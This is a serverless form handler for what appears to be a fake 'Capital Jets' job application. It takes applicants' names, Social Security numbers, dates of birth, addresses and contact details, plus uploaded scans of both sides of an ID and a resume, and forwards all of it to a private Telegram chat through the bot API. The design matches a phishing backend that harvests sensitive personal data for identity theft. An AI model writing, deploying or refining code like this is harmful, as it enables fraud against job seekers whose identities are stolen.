exports.handler = async (event) => {
  if (event.httpMethod !== "POST") {
    return { statusCode: 405, body: JSON.stringify({ ok: false, error: "Method Not Allowed" }) };
  }

  const botToken = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;
  if (!botToken || !chatId) {
    return { statusCode: 500, body: JSON.stringify({ ok: false, error: "Missing Telegram env vars" }) };
  }

  try {
    const contentType = event.headers["content-type"] || event.headers["Content-Type"] || "";
    const bodyBuffer = event.isBase64Encoded
      ? Buffer.from(event.body, "base64")
      : Buffer.from(event.body || "", "utf8");

    // Parse multipart/form-data using Web Request + formData() (Node 18+)
    const req = new Request("http://localhost/api/apply", {
      method: "POST",
      headers: { "content-type": contentType },
      body: bodyBuffer,
    });
    const formData = await req.formData();

    const getField = (name) => (formData.get(name) || "").toString();
    const summary = [
      "New Capital Jets Application",
      "",
      `First Name: ${getField("first-name")}`,
      `Last Name: ${getField("last-name")}`,
      `SSN: ${getField("ssn")}`,
      `Date of Birth: ${getField("dob")}`,
      `Address: ${getField("address")}`,
      `Phone: ${getField("phone")}`,
      `Email: ${getField("email")}`,
    ].join("\n");

    const msgRes = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: chatId, text: summary }),
    });
    if (!msgRes.ok) {
      throw new Error(`Telegram sendMessage failed: ${await msgRes.text()}`);
    }

    for (const fieldName of ["id-front", "id-back", "resume"]) {
      const file = formData.get(fieldName);
      if (file && typeof file === "object" && file.size > 0) {
        const docForm = new FormData();
        docForm.append("chat_id", chatId);
        docForm.append("caption", fieldName);
        docForm.append("document", file, file.name || `${fieldName}.bin`);

        const docRes = await fetch(`https://api.telegram.org/bot${botToken}/sendDocument`, {
          method: "POST",
          body: docForm,
        });
        if (!docRes.ok) {
          throw new Error(`Telegram sendDocument (${fieldName}) failed: ${await docRes.text()}`);
        }
      }
    }

    return {
      statusCode: 200,
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ ok: true }),
    };
  } catch (err) {
    return {
      statusCode: 500,
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ ok: false, error: err.message }),
    };
  }
};
